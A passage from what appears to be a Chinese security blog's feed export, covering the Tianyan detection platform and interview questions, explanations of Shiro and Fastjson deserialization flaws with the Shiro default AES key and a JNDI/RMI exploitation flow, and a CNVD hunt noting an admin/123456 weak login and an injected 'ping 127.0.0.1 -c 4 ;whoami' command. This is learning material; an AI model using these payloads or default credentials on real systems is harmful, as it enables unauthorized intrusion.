src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576833922.png" alt="1719576833922"></p><p>数据传输数据</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577060799.png" alt="1719577060799"></p><p>snmp管理</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577099335.png" alt="1719577099335"></p><p>安全性配置</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577181717.png" alt="1719577181717"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577238499.png" alt="1719577238499"></p><p>敏感操作密码</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577312483.png" alt="1719577312483"></p><p>单点登录密匙</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577350110.png" alt="1719577350110"></p><p>账号管理</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577530241.png" alt="1719577530241"></p><p>操作审计</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719577607883.png" alt="1719577607883"></p><h2 id="天眼分析平台"><a href="#天眼分析平台" class="headerlink" title="天眼分析平台"></a>天眼分析平台</h2><p>提供了一个全面的溯源分析能力，</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719578578628.png" alt="1719578578628"></p><p>存储日志分为三种</p><p>告警日志</p><p>来自探针（记录双向完整绘画，例如不存在恶意攻击流量则不会保留流量，而是记录流量的关键信息（http请求的状态码），形成网络日志存储）和沙箱的告警</p><p>网络日志</p><p>终端日志</p><p>存储天眼的终端日志，记录了mac地址，dns信息，进程端口信息</p><p>和传感器的区别</p><p>传感器同时也能存储报警日志，但是传感器的磁盘空间没有分析平台大，当流量攻击日志达到特定的值，旧的日志会进行覆盖</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719579604567.png" alt="1719579604567"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719579640598.png" alt="1719579640598"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719579674412.png" alt="1719579674412"></p><h2 id="文件威胁鉴定器"><a href="#文件威胁鉴定器" class="headerlink" title="文件威胁鉴定器"></a>文件威胁鉴定器</h2><p>传感器将文件日志传入文件威胁鉴定器，经过静态检测，动态检测，行为分析</p><h2 id="常见协议字段和语法"><a href="#常见协议字段和语法" class="headerlink" title="常见协议字段和语法"></a>常见协议字段和语法</h2><p>分析中心搜索</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719583038900.png" alt="1719583038900"></p><p>搜索语法：字段名称，项以及运算符</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719583242628.png" alt="1719583242628"></p><p>可使用通配符查询(?)，范围查询（to）,使用\进行转义</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719583335797.png" alt="1719583335797"> </p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719585560611.png" alt="1719585560611"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719585987177.png" alt="1719585987177"></p><h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719586218601.png" alt="1719586218601"></p><p>tcp分成七块</p><p>数据分片 发送端进行分片，在接收端进行重组 、由tcp确认分片的大小，控制分片进行重组</p><p>到达确认 就是接收端接收到了这个分片的数据的时候，然后根据片的数据的这个序号，去向发送端去确认发一个确认请求</p><p>超时重发</p><p>就是发送方如果说在发送分片的时候，启动了这个超时的这个定时器，没有收到相应的确认</p><p>滑动窗口 TCP接收缓空间的这个大小都是固定的，接收端只允许另一端去发送过来的缓冲区所能接受的数据</p><p>时序处理 传输过程中，丢失了顺序，将分片重新进行排序，以正确的数据提交给这个应用层</p><p>重复处理 数据分片可能会发送重复，tcp丢掉重复的数据</p><p>数据校验 检测端到端数据有没有发生变化</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587085756.png" alt="1719587085756"></p><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587075133.png" alt="1719587075133"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587157361.png" alt="1719587157361"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587190182.png" alt="1719587190182"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587252832.png" alt="1719587252832"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587272730.png" alt="1719587272730"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587359939.png" alt="1719587359939"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587443598.png" alt="1719587443598"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587469776.png" alt="1719587469776"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587513796.png" alt="1719587513796"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587856375.png" alt="1719587856375"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587889261.png" alt="1719587875906"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587907454.png" alt="1719587907454"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587919911.png" alt="1719587919911"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719587935193.png" alt="1719587935193"></p><h2 id="常见面试题目"><a href="#常见面试题目" class="headerlink" title="常见面试题目"></a>常见面试题目</h2><p>1.在天眼分析平台网络协议中sip、dip、sport、dport字段表示的含义是什么？<br>sip 源IP、dip 目的IP、sport 源端口、dport 目的端口</p><p>2.在天眼分析平台DNS协议中dns type字段表示的含义是?<br>dns type表示DNS请求类型 0代表DNS请求，1代表DNS响应</p><p>3.dns_type中addr代表什么？<br>表示该host对应的IP地址信息；可能有多个记录</p><p>4.天眼可以捕捉到cmd命令嘛？<br>可以捕捉到远程执行的，比如攻击者远控你内网机器，执行cmd并返回结果</p><p>5.天眼告警可以显示的结果，除了成功和失败还有什么嘛？<br>成功、失败、尝试、未知</p><p>未知：一般是告警生成错误了，可以忽略</p><p>尝试：是可能成功也可能失败， 需要全部分析</p><p>6.内网横向有哪些告警类型？<br>cs相关告警、隧道类告警、内网段的漏洞扫描、暴力破解</p><p>内网主机对内部其他主机的攻击行为，该主机可能被黑客控制沦为跳板机，企图控制更多的内网其他主机</p><p>7.使用天眼，如何判断资产是否失陷？<br>受害资产不断外联恶意地址，受害资产有shell连接或者隧道类的告警</p><p>8.出现受害ip为源的时候是什么情况?<br>当网络攻击者使用IP欺骗或伪造技术时，可能会发生受害IP为源的情况</p><p>9.在天眼分析中，威胁告警检索字段中 attack sip 字段表示的含义是什么?<br>攻击者IP</p><p>10.在天眼分析平台中,proto字段表示的含义是? 举两个邮件应用协议的例子<br>proto表示协议，邮件应用协议有ETP POPIMAP</p><p>11.在天眼分析平台中，IOC代表什么含义、反映？<br>IOC表示匹配成功的威胁情报</p><p>IOC反映主机或网络失陷特征信息，包括入侵工具、恶意软件和攻击者的属性</p><p>12.天眼中搜索一个日志里指定的端口？想把两个端口连接在一起查询？<br>sport eq 80</p><p>sport eq 80 or sport eq 443</p><p>13.一个告警的目的ip是114.114.114，端口是53，这样的告警，我应该对他的ip和端口进行封禁吗?<br>不能封禁，明显是dns服务器转发的地址和端口，需要进一步确认真实受害资产的ip信息</p><p>14.在天眼分析平台中，如何搜索源IP为A，目的IP为B的网络日志?运算符(AND)是大写还是小写?<br>ip(A) AND dip(B)</p><p>运算符需要大写</p><p>15.在天眼分析平台中，运算符都有哪些？<br>AND OR NOT</p><p>16.天眼分析平台中，发件人的字段是什么？<br>from</p><p>17.天眼分析平台模糊搜索，应该怎么写查询语句?<br>直接在日志检索模块去搜索你要输入的关键字</p><p>使用*加部分名称进行检索</p><p>18.GEO字段代表什么？<br>代表ip对应的地理位置</p><p>19.不出网的主机通过哪种代理方式建立连接？<br>正向代理</p><p>20天眼能捕捉到0day吗？<br>可以，需要通过日志去分析挖掘</p><p>21.天眼里的小工具用过吗？<br>用过，可以做一些常见编码的解码等，比如base64解码、url解码</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全设备 </tag>
            
            <tag> 天眼 </tag>
            
            <tag> TCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro漏洞及原理</title>
      <link href="/2024/06/22/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%8E%9F%E7%90%86/"/>
      <url>/2024/06/22/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="shiro漏洞及原理"><a href="#shiro漏洞及原理" class="headerlink" title="shiro漏洞及原理"></a>shiro漏洞及原理</h1><h2 id="shiro是什么"><a href="#shiro是什么" class="headerlink" title="shiro是什么"></a>shiro是什么</h2><p><strong>Apache Shiro</strong>框架是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。</p><h2 id="shiro的漏洞原理"><a href="#shiro的漏洞原理" class="headerlink" title="shiro的漏洞原理"></a>shiro的漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;&#x3D;1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，这就更容易触发RCE漏洞。<br>所以我们Payload产生的过程：<br>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值</p><h3 id="Shiro服务器识别身份加解密处理的流程"><a href="#Shiro服务器识别身份加解密处理的流程" class="headerlink" title="Shiro服务器识别身份加解密处理的流程"></a>Shiro服务器识别身份加解密处理的流程</h3><p>（1）加密</p><p>1.用户使用账号密码进行登录，并勾选”Remember Me”。</p><p>2、Shiro验证用户登录信息，通过后，查看用户是否勾选了”Remember Me“。</p><p>3、若勾选，则将用户身份序列化，并将序列化后的内容进行AES加密，再使用base64编码。</p><p>4、最后将处理好的内容放于cookie中的rememberMe字段。</p><p>（2）解密</p><p>1、当服务端收到来自未经身份验证的用户的请求时，会在客户端发送请求中的cookie中获取rememberMe字段内容。</p><p>2、将获取到的rememberMe字段进行base64解码，再使用AES解密。</p><p>3、最后将解密的内容进行反序列化，获取到用户身份。</p><p>（3）Key</p><p>AES加密的密钥Key被硬编码在代码里</p><p>于是可得到Payload的构造流程：</p><p>恶意命令–&gt;序列化–&gt;AES加密–&gt;base64编码–&gt;发送Cookie</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a><strong>漏洞验证</strong></h2><p>未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段<br>登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe&#x3D; deleteMe 字段<br>不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段<br>勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段，还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段<br>或者可以在cookie后面自己加一个rememberMe&#x3D;1,看返回包有没有rememberMe&#x3D; deleteMe</p><h2 id="Shiro-550反序列化漏洞"><a href="#Shiro-550反序列化漏洞" class="headerlink" title="Shiro-550反序列化漏洞"></a>Shiro-550反序列化漏洞</h2><p>shiro-550主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞，造成的原因是默认加密密钥是硬编码在shiro源码中，任何有权访问源代码的人都可以知道默认加密密钥。于是攻击者可以创建一个恶意对象，对其进行序列化、编码，然后将其作为cookie的rememberMe字段内容发送，Shiro 将对其解码和反序列化，导致服务器运行一些恶意代码。</p><p>特征：cookie中含有rememberMe字段</p><h2 id="Shiro-721反序列化漏洞"><a href="#Shiro-721反序列化漏洞" class="headerlink" title="Shiro-721反序列化漏洞"></a>Shiro-721反序列化漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>在Shiro721中，Shiro通过AES-128-CBC对cookie中的rememberMe字段进行加密，所以用户可以通过PaddingOracle加密生成的攻击代码来构造恶意的rememberMe字段，进行反序列化攻击，需要执行的命令越复杂，生成payload需要的时间就越长。</p><h3 id="shrio550和721的区别"><a href="#shrio550和721的区别" class="headerlink" title="shrio550和721的区别"></a><strong>shrio550和721的区别</strong></h3><p>主要区别在于Shiro550使用已知默认密码，只要有足够的密码，不需要Remember Cookie的<br>Shiro721的ase加密的key为系统随机生成，需要利用登录后的rememberMe去爆破正确的key值。<br>利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，再去构造反序列化攻击。</p><h3 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>URL中含有Shiro字段</p><p>cookie中含有rememberMe字段</p><p>返回包中含有rememberMe</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架漏洞 </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson的原理</title>
      <link href="/2024/06/22/2024-06-22-Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/"/>
      <url>/2024/06/22/2024-06-22-Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>是什么</p><h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><h2 id="json是什么"><a href="#json是什么" class="headerlink" title="json是什么"></a>json是什么</h2><p>json：Json是一种轻量级的数据交换格式，应该在一个程序员的开发生涯中是常接触的。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​        &quot;name&quot;:&quot;BossFrank&quot;,</span><br><span class="line"></span><br><span class="line">​        &quot;age&quot;:23,</span><br><span class="line"></span><br><span class="line">​        &quot;media&quot;:[&quot;CSDN&quot;,&quot;bilibili&quot;,&quot;Github&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fastjson：是一个Java库，可用于将Java对象转换为其JSON表示。它还可用于将JSON字符串转换为等效的Java对象。<strong>Fastjson可以处理任意Java对象，包括您没有源代码的预先存在的对象</strong>。</p><p>Fastjson漏洞的形成</p><p><strong>fastjson的漏洞本质还是一个java的反序列化漏洞，由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法。</strong></p><p><strong>fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制</strong></p><p>对于JSON框架来说，想要把一个Java对象转换成字符串有两种方法</p><p>1.基于setter&#x2F;getter</p><p>2.基于属性（AutoType）</p><p>基于setter&#x2F;getter</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Apple implements Fruit &#123;</span><br><span class="line">    private Big_Decimal price;</span><br><span class="line">    //省略 setter/getter、toString等</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class iphone implements Fruit &#123;</span><br><span class="line">    private Big_Decimal price;</span><br><span class="line">    //省略 setter/getter、toString等</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个类只有一个接口的时候，将这个类的对象序列化的时候，就会将子类抹去，只保留接口的类型，最后导致反序列化时无法得到原始类型。本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是否是别的子类。</p><p>基于AutoType</p><p>为了解决上述问题： fastjson引入了基于属性（AutoType），即在序列化的时候，先把原始类型记录下来<br>{ “fruit”:{ “@type”:”com.hollis.lab.fastjson.test.Apple”, “price”:0.5 } }</p><p>引入AutoType后，iphone类对象序列化为json格式后为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;fruit&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.iphone&quot;, &quot;price&quot;:5000 &#125; &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p><h2 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a>漏洞利用流程</h2><p>攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。<br>存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？<br>rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。<br>靶机服务器执行了恶意代码，被攻击者成功利用。<br><img src="/2024/06/22/2024-06-22-Fastjson%E7%9A%84%E5%8E%9F%E7%90%86/1.png" alt="1719025936008"></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="fastjson不出网怎么利用"><a href="#fastjson不出网怎么利用" class="headerlink" title="fastjson不出网怎么利用"></a>fastjson不出网怎么利用</h3><h3 id="TemplatesImpl利用连"><a href="#TemplatesImpl利用连" class="headerlink" title="TemplatesImpl利用连"></a>TemplatesImpl利用连</h3><p>版本 1.2.24<br>苛刻条件：</p><ol><li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞： JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</li><li>服务端使用parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField)<br>这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private 属性，要满足private属性的数据。所以比较苛刻，完全凭运气</li></ol><p>apache-BCEL，直接传入字节码不需要出网就可执行恶意代码但是需要引入tomcat的依赖，但在实际攻击中还算是比较常见的。</p><p>fastjson不出网利用<br>fastjson≤1.2.24</p><p>条件:BasicDataSource只需要有dbcp或tomcat-dbcp的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接，还是挺常见的。</p><p>参考链接：</p><p><a href="https://blog.csdn.net/Bossfrank?type=blog">Boss_frank-CSDN博客</a></p><p>[fastjson反序列化漏洞演示加详细讲解加原理_哔哩哔哩_bilibili</p><p><a href="https://blog.csdn.net/weixin_49248030/article/details/127989449">fastjson-BCEL不出网打法原理分析_fastjson不出网是什么-CSDN博客</a>](<a href="https://www.bilibili.com/video/BV1Ab4y1d7w1/?vd_source=e52c0be348f431bd52ecb6f73987ebbd">https://www.bilibili.com/video/BV1Ab4y1d7w1/?vd_source=e52c0be348f431bd52ecb6f73987ebbd</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个网站的测试思路</title>
      <link href="/2024/06/16/2024-06-16-%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/"/>
      <url>/2024/06/16/2024-06-16-%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>一、未授权访问</p><p>findsometing 提取接口，如果对js比较熟悉，可以在js里搜索接口</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思路技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次cnvd渗透</title>
      <link href="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/"/>
      <url>/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>前言：挖src挖郁闷了，闲来无事选择挖一个cnvd来练练手，本次的漏洞都没啥难度，企查查资产过了5000万</p><p>说一下cnvd证书的下放标准</p><p>对于中危及中危以上通用型漏洞（CVSS2.0基准评分超过4.0分），以及涉及党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞(后续对事件型漏洞证明颁发标准将参考中央网信办颁布的关键基础设施相关定义和分类)，CNVD将给予原创漏洞证明（即CNVD漏洞证书，电子版），该证明可通过编号在CNVD官方网站进行查询跟踪。时限要求：按周对上一周归档漏洞且满足证书颁发条件的进行批量制作。</p><p>事件型：高危 重要机构<br>通用型：中危及以上（评分4.0） 注册资金5000w以上，黑盒的测试案例10或以上（3复现+7其他案例，其他案例不要求复现），白盒的得有源码以及提供漏洞处代码调试过程，包含截图和原因。</p><p>过程：</p><p>fofa寻找目标</p><p>app&#x3D;”xx目标系统”</p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552039297.png" alt="1717552039297"></p><p>admin ,123456 成功登录管理员用户（弱口令yyds）</p><p>RCE</p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552211132.png" alt="1717552211132"></p><p>发现这里有一个ping 的功能，我想这里应该会存在rce漏洞</p><p>ping 127.0.0.1 -c 4 ;whoami （成功rce）</p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552367582.png" alt="1717552367582"></p><p><img 